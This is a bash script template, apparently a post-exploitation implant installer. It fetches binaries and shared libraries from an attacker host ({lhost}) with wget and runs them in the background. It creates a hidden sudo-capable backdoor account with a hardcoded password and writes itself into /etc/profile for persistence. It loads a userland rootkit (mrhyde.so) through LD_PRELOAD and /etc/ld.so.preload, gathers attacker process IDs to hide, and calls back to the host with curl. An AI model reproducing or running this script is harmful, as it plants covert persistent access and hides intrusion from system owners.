#!/bin/bash
wget -O /tmp/{line} http://{lhost}/{line}
wget -O /tmp/{line}_service.sh http://{lhost}/{line}_service.sh 
wget -O /tmp/l_{line}_service.sh http://{lhost}/l_{line}_service.sh
wget -O /tmp/l_{line} http://{lhost}/l_{line} 
wget -O /tmp/monrev http://{lhost}/monrev 
wget -O /tmp/monrevlin http://{lhost}/monrevlin 
wget -O /tmp/mrhyde.so http://{lhost}/mrhyde.so 
wget -O /tmp/libc.so.6 http://{lhost}/libc.so.6 
wget -O /tmp/ld-linux-x86-64.so.2 http://{lhost}/ld-linux-x86-64.so.2 
chmod +x /tmp/{line} 
chmod +x /tmp/{line}_service.sh 
chmod +x /tmp/l_{line} 
chmod +x /tmp/monrev 
useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0
cp /tmp/mrhyde.so /home/.grisun0/
cp /tmp/libc.so.6 /home/.grisun0/
cp /tmp/ld-linux-x86-64.so.2 /home/.grisun0/
echo "/home/.grisun0/payload.sh" | tee -a /etc/profile
$2='$2'
echo "ps aux | grep -Ei '(.*{lhost}.*|.*{line}.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid" | tee -a /etc/profile
touch /dev/shm/file
./tmp/{line}_service.sh &
./tmp/{line} &
./tmp/l_{line} &
echo "[*] Pids to hide:"
ps aux | grep -Ei '(.*{lhost}.*|.*grisun0.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\.sh.*)' | awk '{print $2}' | xargs -I {} echo "\"{}\"," >> /dev/shm/pid
chown grisun0:grisun0 /home/.grisun0/ -R 
echo 'export LD_PRELOAD=/home/.grisun0/mrhyde.so' | tee -a /etc/profile
export LD_PRELOAD=/home/.grisun0/libc.so.6:/home/.grisun0/ld-linux-x86-64.so.2:/home/.grisun0/mrhyde.so 
echo "/home/.grisun0/mrhyde.so" | tee -a /etc/ld.so.preload
bash -c 'echo "export LD_PRELOAD=/home/.grisun0/libc.so.6:/home/.grisun0/ld-linux-x86-64.so.2:/home/.grisun0/mrhyde.so " > /etc/profile.d/ld_preload.sh'
./tmp/monrev
curl http://{lhost}/Finish_him